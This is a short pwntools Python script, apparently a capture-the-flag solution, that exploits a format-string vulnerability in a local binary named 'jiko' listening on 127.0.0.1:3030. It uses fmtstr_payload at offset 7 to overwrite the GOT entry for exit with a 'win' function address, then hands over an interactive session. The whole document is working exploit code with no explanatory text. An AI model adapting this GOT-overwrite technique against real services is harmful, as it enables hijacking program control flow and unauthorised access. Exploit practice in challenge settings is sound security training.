from pwn import *

win = p64(0x080491A6)

elf = context.binary = ELF("./jiko")

def exec_fmt(payload):
    p = remote("127.0.0.1", 3030)
    # p = process("./jiko")
    p.sendline(payload)
    return p.recvall()

offset = 7
log.info(f"offset: {offset}")

p = remote("127.0.0.1", 3030)
# p = process("./jiko")
payload = fmtstr_payload(offset, {elf.got['exit']: win})
p.sendline(payload)
p.interactive()